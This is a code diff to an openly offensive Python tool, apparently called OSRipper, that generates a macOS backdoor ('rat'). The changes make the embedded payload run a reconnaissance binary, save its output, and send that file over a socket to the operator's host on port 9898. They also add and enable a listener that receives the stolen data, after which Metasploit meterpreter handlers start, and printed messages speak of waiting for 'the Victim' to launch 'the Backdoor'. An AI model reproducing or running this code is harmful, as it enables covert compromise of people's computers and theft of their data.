@@ -3,6 +3,7 @@ import socket
 import shutil
 import requests
 from pickle import GLOBAL
+bind=0
 logo = """
 
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
@@ -390,10 +391,12 @@ def rep_syst():
     if hide == 'y':
         global name2
         if bind == '1':
-            host='localhost'
+            host2='localhost'
+        else:
+            host2=host
         name2=input('Please enter the name for the rat: ')
         with open(name2, 'a+') as hider:
-            hider.write(str('host = "'+host+'"\n'))
+            hider.write(str('host = "'+host2+'"\n'))
             v= '''
 import os
 import shutil
@@ -412,32 +415,38 @@ shutil.copy(src1, dest1)
 os.system('chmod u+x '+dest1)
 os.system(dest1+' > /users/shared/output.txt')
 time.sleep(10)
+
 import socket
-import time
+import sys
 
-TCP_IP = 'localhost'
-TCP_PORT = 9001
-BUFFER_SIZE = 1024
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((TCP_IP, TCP_PORT))
-recived_f = '/users/shared/output.txt'
-with open(recived_f, 'wb') as f:
-    print('file opened')
-    while True:
-        #print('receiving data...')
-        data = s.recv(BUFFER_SIZE)
-        print('data=%s', (data))
-        if not data:
-            f.close()
-            print('file close()')
-            break
-        # write data to a file
-        f.write(data)
+ServerIp = host
 
-print('Successfully get the file')
+
+
+# Now we can create socket object
+s = socket.socket()
+
+# Lets choose one port and connect to that port
+PORT = 9898
+
+# Lets connect to that port where server may be running
+s.connect((ServerIp, PORT))
+
+# We can send file sample.txt
+file = open("/users/shared/output.txt", "rb")
+SendData = file.read(1024)
+
+
+while SendData:
+    # Now we can receive data from server
+    #Now send the content of sample.txt to server
+    s.send(SendData)
+    SendData = file.read(1024)      
+
+# Close the connection from client side
 s.close()
-print('connection closed')
+#print('connection closed')
 os.system('chmod u+x '+dest)
 os.system(dest)
 
@@ -447,53 +456,50 @@ os.system(dest)
             os.system('sudo pyinstaller --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "dist/ocr_or:ocr" '+str(name2))
 def server():
     import socket
-    from threading import Thread
 
-    TCP_IP = 'localhost'
-    TCP_PORT = 9001
-    BUFFER_SIZE = 1024
+    # Now we can create socket object
+    s = socket.socket()
 
+    # Lets choose one port and start listening on that port
+    PORT = 9898
+    print("\n Server is listing on port :", PORT, "\n")
 
-    class ClientThread(Thread):
+    # Now we need to bind to the above port at server side
+    s.bind(('', PORT))
 
-        def __init__(self, ip, port, sock):
-            Thread.__init__(self)
-            self.ip = ip
-            self.port = port
-            self.sock = sock
-            print(" New thread started for "+ip+":"+str(port))
+    # Now we will put server into listenig  mode 
+    s.listen(10)
 
-        def run(self):
-            filename = 'output.txt'
-            f = open(filename, 'rb')
-            while True:
-                l = f.read(BUFFER_SIZE)
-                while (l):
-                    self.sock.send(l)
-                    #print('Sent ',repr(l))
-                    l = f.read(BUFFER_SIZE)
-                if not l:
-                    f.close()
-                    self.sock.close()
-                    break
+    #Open one recv.txt file in write mode
+    file = open("recv.txt", "wb") 
+    #print("\n Copied file name will be recv.txt at server side\n")
 
-
-    tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    tcpsock.bind((TCP_IP, TCP_PORT))
-    threads = []
-
+    # Now we do not know when client will concatct server so server should be listening contineously  
     while True:
-        tcpsock.listen(5)
-        print("Waiting for incoming connections...")
-        (conn, (ip, port)) = tcpsock.accept()
-        print('Got connection from ', (ip, port))
-        newthread = ClientThread(ip, port, conn)
-        newthread.start()
-        threads.append(newthread)
+        # Now we can establish connection with clien
+        conn, addr = s.accept()
 
-    for t in threads:
-        t.join()
+        # Send a hello message to client
+        #msg = "\n\n|---------------------------------|\n Hi Client[IP address: "+ addr[0] + "], \n ֲֳ**Welcome to Server** \n -Server\n|---------------------------------|\n \n\n"    
+        #conn.send(msg.encode())
+        
+        # Receive any data from client side
+        RecvData = conn.recv(1024)
+        while RecvData:
+            file.write(RecvData)
+            RecvData = conn.recv(1024)
+
+        # Close the file opened at server side once copy is completed
+        file.close()
+        print("\n File has been copied successfully \n")
+
+        # Close connection with client
+        conn.close()
+        print("\n Server closed the connection \n")
+
+        # Come out from the infinite while loop as the file has been copied from client.
+        break
+
 def cleanup():
     try:
         os.remove(os.getcwd()+'/dist/ocr_or')
@@ -532,7 +538,7 @@ if nscan == "1":
     print('Generated in dist')
     print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
     print('After that the listener will spawn instantly')
-    #server()
+    server()
     port=input('Please enter the port you want to listen on: ')
     a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/bind_tcp;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
     os.system(a)
@@ -549,7 +555,7 @@ if nscan == "3":
     print('Generated in dist')
     print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
     print('After that the listener will spawn instantly')
-    #server()
+    server()
     port=input('Please enter the port you want to listen on: ')
     a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_http;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
     os.system(a)
@@ -562,7 +568,7 @@ if nscan == "4":
     print('Generated in dist')
     print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
     print('After that the listener will spawn instantly')
-    #server()
+    server()
     port=input('Please enter the port you want to listen on: ')
     a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
     os.system(a)
